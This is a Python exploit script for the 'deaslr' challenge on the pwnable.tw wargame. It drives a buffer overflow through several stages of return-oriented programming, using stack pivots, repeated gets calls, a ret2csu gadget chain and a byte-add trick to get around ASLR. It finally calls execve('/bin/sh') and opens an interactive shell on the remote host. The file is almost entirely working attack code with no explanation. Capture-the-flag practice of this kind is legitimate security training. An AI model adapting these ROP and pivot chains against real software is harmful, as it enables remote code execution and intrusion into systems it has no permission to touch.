#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./deaslr')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10402)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00400508
continue
'''.format(**locals())

# -- Exploit goes here --

def call_gets(addr):
    rop = flat([

        gadget("pop rdi; ret"),
        addr,
        exe.sym.gets

])
    return rop

def ret2csu_rop(what, rdi, rsi, rdx):
    pop_all = 0x00000000004005ba
    mov = 0x0000000000400598
    rop = flat([

        pop_all,
        0x0,
        0x1,
        what,
        rdx,
        rsi,
        rdi,
        mov,
        0xdeadbeef,
        0x0,
        0x1,
        what,
        0x0,
        0x0,
        0xabcdef,

        ])
    return rop


io = start()
syscall = 0x6013b0
libc = ELF("./libc.so.6")
bss = exe.bss(0x100 - 8)
stage_1_rop = 0x601380
stage_2_rop = 0x601600
nop = 0x000000004005c6
add_rcx_al = 0x00400508

padding = b"A"*16 + p(stage_1_rop-8)
pop_rbp_r14_r15 = 0x000000004005bf
pause()
rop1 = padding + pop("rdi", stage_1_rop-8) + p(exe.sym.gets) + gadget("leave; ret")
rop1 = padding + call_gets(stage_1_rop-8) + gadget("leave; ret") + b"A"*512
sl(rop1)
pause()
rop2 = gadget("pop rdi; ret") + call_gets(0x601388) + call_gets(0x601388) + gadget("ret;") * 5 +  call_gets(0x6013a0-8) + call_gets(0x6013b8)
sl(rop2)
pause()
sl(gadget("pop rdi; ret") + gadget("ret;") * 5 +  call_gets(0x6013a0-8)  + call_gets(0x6013b8)  + gadget("ret;")*50 + call_gets(0x6013d0)                      )
pause()
sl(p(0x601f80) + p(0x000000004005c6) + p(0x000000004005bc) + b"\xc0")
pause()

sl( (p(add_rcx_al) + p(exe.sym.main) + b"A" + gadget("ret;") + p(nop) + pop("rbp",0x6013b8-8 ) + gadget("leave; ret") + b"" + p(nop)*12 + call_gets(0x601458-0x130) ).ljust(312, b"\x65") + p(0xffffffc7) + gadget("ret; ")*4 + p(0x00000000004005ba) + p(170987) + p(0x6013a8-8) + p(syscall) + p(0x601318+1)*3 + gadget("leave; ret"))
pause()
syscall = 0x601318
binsh = 0x6013e8
mov_eax_0_leave_ret = 0x0000000040054f
sl( (b"\x00").ljust(200-8, b"\x00") + b"/bin/sh\x00" + p(0x7f+2) + p(add_rcx_al) + ( pop("rbp", 0x601418-8) + p(mov_eax_0_leave_ret) +  ret2csu_rop(what=syscall, rdi=0, rsi=0x6019c0, rdx=0x3b) + ret2csu_rop(what=syscall, rdi=binsh, rsi=0, rdx=0) ).ljust(496, b"\xff")  + p(0x601318))
pause()
sl(b"4n0nym4u5".ljust(0x3b+1, b"\xff"))
io.interactive()
